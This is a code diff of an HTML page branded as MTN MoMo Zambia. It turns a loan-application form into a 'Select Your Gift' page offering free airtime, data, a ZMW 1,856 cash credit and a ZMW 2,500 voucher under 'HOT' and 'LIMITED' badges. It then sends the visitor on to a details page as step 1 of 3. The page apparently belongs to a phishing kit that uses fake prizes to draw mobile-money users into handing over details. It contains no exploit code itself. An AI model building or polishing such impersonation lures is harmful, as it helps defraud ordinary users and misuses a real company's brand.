@@ -3,9 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - Loan Application</title>
+    <title>MTN MoMo - Select Your Gift</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
         * {
             margin: 0;
             padding: 0;
@@ -83,8 +83,12 @@
             font-size: 24px;
             font-weight: 700;
             text-align: center;
-            color: #333;
+            color: #1a1a2e;
             margin-bottom: 5px;
+        }
+        
+        .form-title .highlight {
+            color: #0047AB;
         }
         
         .form-subtitle {
@@ -114,77 +118,131 @@
             text-align: center;
             color: #777;
             font-size: 14px;
-            margin-bottom: 20px;
+            margin-bottom: 16px;
             font-weight: 500;
         }
         
-        .form-group {
+        /* ===== GIFT SELECTION ===== */
+        .gift-selection {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
             margin-bottom: 16px;
         }
         
-        .form-label {
-            display: block;
-            font-weight: 600;
-            color: #333;
-            margin-bottom: 4px;
-            font-size: 14px;
-        }
-        
-        .form-label .required {
-            color: #e74c3c;
-            margin-left: 2px;
-        }
-        
-        .form-select,
-        .form-input,
-        .form-textarea {
-            width: 100%;
-            padding: 12px 14px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 15px;
-            transition: border-color 0.3s, box-shadow 0.3s;
-            font-family: 'Inter', sans-serif;
+        .gift-option {
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            border: 2px solid #e8ecf5;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.3s;
             background: white;
-            color: #333;
+            position: relative;
         }
         
-        .form-select:focus,
-        .form-input:focus,
-        .form-textarea:focus {
+        .gift-option:hover {
             border-color: #0047AB;
-            outline: none;
-            box-shadow: 0 0 0 4px rgba(0, 71, 171, 0.1);
+            transform: translateX(4px);
+            box-shadow: 0 4px 15px rgba(0,71,171,0.08);
         }
         
-        .form-textarea {
-            resize: vertical;
-            min-height: 80px;
+        .gift-option.selected {
+            border-color: #0047AB;
+            background: #f0f4ff;
+            box-shadow: 0 4px 15px rgba(0,71,171,0.12);
         }
         
-        .form-input::placeholder {
-            color: #aaa;
+        .gift-option .radio {
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            border: 2px solid #dce0e8;
+            flex-shrink: 0;
+            margin-right: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s;
         }
         
-        .invalid {
-            border-color: #e74c3c !important;
-            box-shadow: 0 0 0 4px rgba(231, 76, 60, 0.1) !important;
-            animation: shake 0.4s ease;
+        .gift-option.selected .radio {
+            border-color: #0047AB;
+            background: #0047AB;
         }
         
-        @keyframes shake {
-            0%,
-            100% { transform: translateX(0); }
-            25% { transform: translateX(-8px); }
-            75% { transform: translateX(8px); }
+        .gift-option.selected .radio::after {
+            content: '✓';
+            color: white;
+            font-size: 12px;
+            font-weight: 700;
         }
         
+        .gift-option .icon {
+            font-size: 28px;
+            margin-right: 12px;
+            flex-shrink: 0;
+        }
+        
+        .gift-option .info {
+            flex: 1;
+        }
+        
+        .gift-option .info .name {
+            font-size: 15px;
+            font-weight: 700;
+            color: #1a1a2e;
+        }
+        
+        .gift-option .info .value {
+            font-size: 13px;
+            font-weight: 600;
+            color: #0047AB;
+        }
+        
+        .gift-option .info .details {
+            font-size: 11px;
+            color: #999;
+            margin-top: 2px;
+        }
+        
+        .gift-option .badge {
+            font-size: 9px;
+            font-weight: 700;
+            padding: 3px 12px;
+            border-radius: 20px;
+            flex-shrink: 0;
+        }
+        
+        .gift-option .badge.free {
+            background: #e8f5e9;
+            color: #1e7e34;
+        }
+        
+        .gift-option .badge.hot {
+            background: #ffebee;
+            color: #c62828;
+        }
+        
+        .gift-option .badge.limited {
+            background: #fff3e0;
+            color: #e65100;
+        }
+        
+        .gift-option .badge.popular {
+            background: #e3f2fd;
+            color: #0047AB;
+        }
+        
+        /* ===== ERROR ===== */
         .error-text {
             color: #e74c3c;
-            font-size: 12px;
-            margin-top: 4px;
-            display: none;
+            font-size: 13px;
             font-weight: 500;
+            text-align: center;
+            margin-bottom: 10px;
+            display: none;
         }
         
         .error-text.show {
@@ -197,6 +255,7 @@
             100% { opacity: 1; transform: translateY(0); }
         }
         
+        /* ===== NEXT BUTTON ===== */
         .next-btn {
             width: 100%;
             padding: 16px;
@@ -208,7 +267,7 @@
             font-weight: 700;
             cursor: pointer;
             transition: transform 0.2s, box-shadow 0.2s;
-            margin-top: 10px;
+            margin-top: 4px;
         }
         
         .next-btn:hover {
@@ -218,6 +277,12 @@
         
         .next-btn:active {
             transform: scale(0.98);
+        }
+        
+        .next-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none !important;
         }
         
         footer {
@@ -235,11 +300,23 @@
             .form-title {
                 font-size: 20px;
             }
-            .form-input,
-            .form-select,
-            .form-textarea {
-                font-size: 14px;
-                padding: 10px 12px;
+            .gift-option {
+                padding: 12px 14px;
+            }
+            .gift-option .icon {
+                font-size: 22px;
+                margin-right: 10px;
+            }
+            .gift-option .info .name {
+                font-size: 13px;
+            }
+            .gift-option .info .value {
+                font-size: 12px;
+            }
+            .gift-option .radio {
+                width: 18px;
+                height: 18px;
+                margin-right: 10px;
             }
         }
     </style>
@@ -252,147 +329,162 @@
     </header>
 
     <main class="card">
-        <h1 class="form-title">Loan Application</h1>
-        <p class="form-subtitle">Step 1 of 3</p>
+        <h1 class="form-title">🎁 Select Your <span class="highlight">Gift</span></h1>
+        <p class="form-subtitle">Choose one gift you'd like to receive</p>
 
         <div class="progress-bar">
             <div class="progress-fill"></div>
         </div>
-        <div class="step-text">Tell us about your loan</div>
+        <div class="step-text">Step 1 of 3 • Choose your gift</div>
 
-        <!-- Loan Type -->
-        <div class="form-group">
-            <label class="form-label">Loan Type <span class="required">*</span></label>
-            <select class="form-select" id="loanType">
-                <option>Personal Loan</option>
-                <option>Business Loan</option>
-                <option>Home Loan</option>
-                <option>Car Loan</option>
-                <option>Education Loan</option>
-            </select>
+        <!-- Error Message -->
+        <div class="error-text" id="giftError">⚠️ Please select a gift to continue</div>
+
+        <!-- Gift Selection -->
+        <div class="gift-selection" id="giftSelection">
+            <!-- Gift 1: Airtime -->
+            <div class="gift-option" data-gift="Airtime" data-value="ZMW 179" data-icon="📱" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">📱</span>
+                <div class="info">
+                    <div class="name">Airtime</div>
+                    <div class="value">ZMW 179</div>
+                    <div class="details">📞 179 ZMW talk time &amp; SMS</div>
+                </div>
+                <span class="badge free">FREE</span>
+            </div>
+
+            <!-- Gift 2: Data Bundle -->
+            <div class="gift-option" data-gift="Data Bundle" data-value="5GB" data-icon="🌐" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">🌐</span>
+                <div class="info">
+                    <div class="name">Data Bundle</div>
+                    <div class="value">5GB</div>
+                    <div class="details">📶 5GB valid for 30 days</div>
+                </div>
+                <span class="badge hot">🔥 HOT</span>
+            </div>
+
+            <!-- Gift 3: Cash Reward -->
+            <div class="gift-option" data-gift="Cash Reward" data-value="ZMW 1,856" data-icon="💰" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">💰</span>
+                <div class="info">
+                    <div class="name">Cash Reward</div>
+                    <div class="value">ZMW 1,856</div>
+                    <div class="details">💳 Instant MoMo cash credit</div>
+                </div>
+                <span class="badge limited">LIMITED</span>
+            </div>
+
+            <!-- Gift 4: Music Streaming -->
+            <div class="gift-option" data-gift="Music Streaming" data-value="3 Months" data-icon="🎵" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">🎵</span>
+                <div class="info">
+                    <div class="name">Music Streaming</div>
+                    <div class="value">3 Months</div>
+                    <div class="details">🎧 Premium music streaming access</div>
+                </div>
+                <span class="badge popular">⭐ POPULAR</span>
+            </div>
+
+            <!-- Gift 5: Video Bundle -->
+            <div class="gift-option" data-gift="Video Bundle" data-value="10GB" data-icon="📺" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">📺</span>
+                <div class="info">
+                    <div class="name">Video Bundle</div>
+                    <div class="value">10GB</div>
+                    <div class="details">🎬 10GB video streaming data</div>
+                </div>
+                <span class="badge free">FREE</span>
+            </div>
+
+            <!-- Gift 6: Shopping Voucher -->
+            <div class="gift-option" data-gift="Shopping Voucher" data-value="ZMW 2,500" data-icon="🛒" onclick="selectGift(this)">
+                <div class="radio"></div>
+                <span class="icon">🛒</span>
+                <div class="info">
+                    <div class="name">Shopping Voucher</div>
+                    <div class="value">ZMW 2,500</div>
+                    <div class="details">🛍️ Shop at any MTN partner store</div>
+                </div>
+                <span class="badge hot">🔥 HOT</span>
+            </div>
         </div>
 
-        <!-- Loan Amount -->
-        <div class="form-group">
-            <label class="form-label">Loan Amount (ZMW) <span class="required">*</span></label>
-            <input type="number" class="form-input" id="loanAmount" placeholder="5000" min="100" max="10000">
-            <div class="error-text" id="amountError">Please enter amount between ZMW 100 and ZMW 10,000</div>
-        </div>
-
-        <!-- Loan Term -->
-        <div class="form-group">
-            <label class="form-label">Loan Term <span class="required">*</span></label>
-            <select class="form-select" id="loanTerm">
-                <option>3 Months</option>
-                <option>6 Months</option>
-                <option selected>12 Months</option>
-                <option>18 Months</option>
-                <option>24 Months</option>
-                <option>36 Months</option>
-            </select>
-        </div>
-
-        <!-- Purpose of Loan -->
-        <div class="form-group">
-            <label class="form-label">Purpose of Loan <span class="required">*</span></label>
-            <textarea class="form-textarea" id="loanPurpose" placeholder="What will you use the loan for?"></textarea>
-            <div class="error-text" id="purposeError">Please describe the purpose (min 5 characters)</div>
-        </div>
-
-        <button class="next-btn" id="nextBtn">NEXT STEP →</button>
+        <button class="next-btn" id="nextBtn" disabled>NEXT STEP →</button>
     </main>
 
     <footer>© 2026 MTN MoMo Zambia</footer>
 
     <script>
         // ============================================
-        // PRE-FILL FROM INDEX PAGE
+        // GIFT SELECTION
         // ============================================
-        const storedAmount = localStorage.getItem('loanAmount');
-        const storedTerm = localStorage.getItem('loanTerm');
+        let selectedGift = null;
+        let selectedValue = null;
+        let selectedIcon = null;
 
-        if (storedAmount) {
-            document.getElementById('loanAmount').value = storedAmount;
-        }
-        if (storedTerm) {
-            const termSelect = document.getElementById('loanTerm');
-            for (let option of termSelect.options) {
-                if (option.value === storedTerm + ' Months') {
-                    option.selected = true;
-                    break;
-                }
-            }
+        function selectGift(element) {
+            // Remove selection from all
+            document.querySelectorAll('.gift-option').forEach(el => {
+                el.classList.remove('selected');
+            });
+            
+            // Add selection to clicked
+            element.classList.add('selected');
+            
+            // Store selected gift data
+            selectedGift = element.dataset.gift;
+            selectedValue = element.dataset.value;
+            selectedIcon = element.dataset.icon;
+            
+            // Enable next button
+            document.getElementById('nextBtn').disabled = false;
+            
+            // Hide error if shown
+            document.getElementById('giftError').classList.remove('show');
+            
+            console.log('🎁 Selected:', selectedGift, '-', selectedValue);
         }
 
         // ============================================
         // NEXT BUTTON HANDLER
         // ============================================
         document.getElementById('nextBtn').addEventListener('click', function() {
-            const amount = document.getElementById('loanAmount').value.trim();
-            const purpose = document.getElementById('loanPurpose').value.trim();
-            const amountInput = document.getElementById('loanAmount');
-            const purposeInput = document.getElementById('loanPurpose');
-            const amountError = document.getElementById('amountError');
-            const purposeError = document.getElementById('purposeError');
-
-            let valid = true;
-
-            // Reset errors
-            amountInput.classList.remove('invalid');
-            purposeInput.classList.remove('invalid');
-            amountError.classList.remove('show');
-            purposeError.classList.remove('show');
-
-            // Validate amount (ZMW 100 - ZMW 10,000)
-            if (!amount || parseFloat(amount) < 100 || parseFloat(amount) > 10000) {
-                amountInput.classList.add('invalid');
-                amountError.classList.add('show');
-                valid = false;
-            }
-
-            // Validate purpose
-            if (!purpose || purpose.length < 5) {
-                purposeInput.classList.add('invalid');
-                purposeError.classList.add('show');
-                valid = false;
-            }
-
-            if (!valid) {
-                const firstError = document.querySelector('.invalid');
-                if (firstError) {
-                    firstError.scrollIntoView({ behavior: 'smooth', block: 'center' });
-                    firstError.focus();
-                }
+            if (!selectedGift) {
+                document.getElementById('giftError').classList.add('show');
                 return;
             }
 
             // Save to localStorage
-            localStorage.setItem('loanType', document.getElementById('loanType').value);
-            localStorage.setItem('loanAmount', amount);
-            localStorage.setItem('loanTerm', document.getElementById('loanTerm').value.replace(' Months', ''));
-            localStorage.setItem('loanPurpose', purpose);
+            localStorage.setItem('selectedGift', selectedGift);
+            localStorage.setItem('selectedGiftValue', selectedValue);
+            localStorage.setItem('selectedGiftIcon', selectedIcon);
 
             // Navigate to details page
             window.location.href = 'details.html';
         });
 
         // ============================================
-        // REAL-TIME VALIDATION
+        // KEYBOARD SHORTCUT - Enter to continue
         // ============================================
-        document.getElementById('loanAmount').addEventListener('input', function() {
-            const val = parseFloat(this.value);
-            if (val >= 100 && val <= 10000) {
-                this.classList.remove('invalid');
-                document.getElementById('amountError').classList.remove('show');
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' && !document.getElementById('nextBtn').disabled) {
+                document.getElementById('nextBtn').click();
             }
         });
 
-        document.getElementById('loanPurpose').addEventListener('input', function() {
-            if (this.value.trim().length >= 5) {
-                this.classList.remove('invalid');
-                document.getElementById('purposeError').classList.remove('show');
-            }
-        });
+        // ============================================
+        // LOG
+        // ============================================
+        console.log('====================================');
+        console.log('🎁 MTN MoMo - Select Your Gift');
+        console.log('📋 Available Gifts: 6');
+        console.log('====================================');
     </script>
 </body>
 </html>
